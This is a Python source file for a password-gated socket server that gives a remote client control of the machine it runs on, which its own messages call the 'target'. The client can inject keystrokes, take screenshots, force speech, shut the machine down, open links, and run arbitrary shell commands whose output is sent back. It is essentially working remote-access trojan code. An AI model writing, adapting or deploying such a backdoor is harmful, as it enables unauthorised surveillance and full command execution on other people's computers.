ip_value = None
port_value = None
password_value = None
def main():
    import socket
    import pyautogui
    import io
    import os
    import time
    import pyttsx3
    import subprocess
    try:
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error as err:
        print(f"Error : {err}")
    print("Socket Created Succesfully")
    time.sleep(2)
    print("Waiting for connection...")
    server.bind((ip_value,port_value))
    server.listen(5)
    while True:
        client,addr = server.accept()
        client.settimeout(300)
        passw = client.recv(4096).decode("utf-8")
        if passw.strip() == password_value:
            print("Succesfully login")
            client.send("Succesfully Login---".encode("utf-8"))
            try:
                while True:
                    data = client.recv(4096)
                    if not data:
                        break
                    final_data = str(data.decode("utf-8"))
                    #keys-
                    if final_data.startswith("press"):
                        key = final_data.replace("press ","")
                        pyautogui.press(key)
                        client.send(f"Successfully Press the Key{key}".encode("utf-8"))
                    #write
                    if final_data.startswith("write"):
                        write = final_data.replace("write ","")
                        pyautogui.write(write,interval=0.1)
                        client.send(f"Successfully Write The Given Text on target : {write}".encode("utf-8"))
                    #hotkey
                    if final_data.startswith("hotkey"):
                        hotkey = final_data.replace("hotkey ","").split("+")
                        pyautogui.hotkey(*hotkey)
                        client.send(f"Successfully Press The hotkey on target".encode("utf-8"))
                    if final_data.startswith("ss"):
                        img = pyautogui.screenshot()
                        buffer = io.BytesIO()
                        img.save(buffer,format="PNG")
                        client.sendall(buffer.getvalue())
                    if final_data.startswith("speak"):
                        speak = final_data.replace("speak ","")
                        times = ""
                        for i in reversed(speak):
                            if i.isdigit():
                                times = times+i
                            else:
                                break
                        final_speak = speak.replace( times,"")
                        j = 1
                        while j <= int(times):
                            pyttsx3.speak(final_speak)
                            j = j+1
                        client.send(f"Successfully Speak The Given Text on target on {times} Time".encode("utf-8"))
                    if final_data.startswith("shutdown"):
                        client.send("Succesfully Shutdown The PC".encode("utf-8"))
                        pyautogui.hotkey("win+d")
                        time.sleep(1)
                        pyautogui.hotkey("alt+f4")
                        time.sleep(0.5)
                        pyautogui.press("enter")
                    if final_data.startswith("run"):
                        run_cmd = final_data.replace("run ","")
                        subprocess.run([fr"{run_cmd}"])
                    if final_data.startswith("cmd"):
                        cmd = final_data.replace("cmd ","")
                        if cmd.startswith("cd"):
                            try:
                                change = cmd.replace("cd ","")
                                os.chdir(change)
                                client.send(f"Changed directory to {os.getcwd()}".encode("utf-8"))
                            except Exception as e:
                                client.send(f"cd Error : {e}".encode("utf-8"))
                        else:
                            try:
                                output_cmd = subprocess.run(cmd,shell=True,capture_output=True,text=True)
                                client.send(output_cmd.stdout.encode("utf-8"))
                            except Exception as e:
                                client.send(f"cmd Error : {e}".encode("utf-8"))
                    if final_data.startswith("youtube"):
                        link = final_data.replace("youtube ","")
                        pyautogui.press("win")
                        time.sleep(0.5)
                        pyautogui.write("microsoft edge",interval=0.1)
                        time.sleep(1)
                        pyautogui.press("enter")
                        time.sleep(4)
                        pyautogui.write(link)
                        time.sleep(1)
                        pyautogui.press("enter")
            except Exception as e:
                print("Client is disconnected")
                print(f"Error : {e}")
                client.close()
        else:
            client.send("Incorrect Password".encode("utf-8"))
            client.close()

    server.close()
    
main()
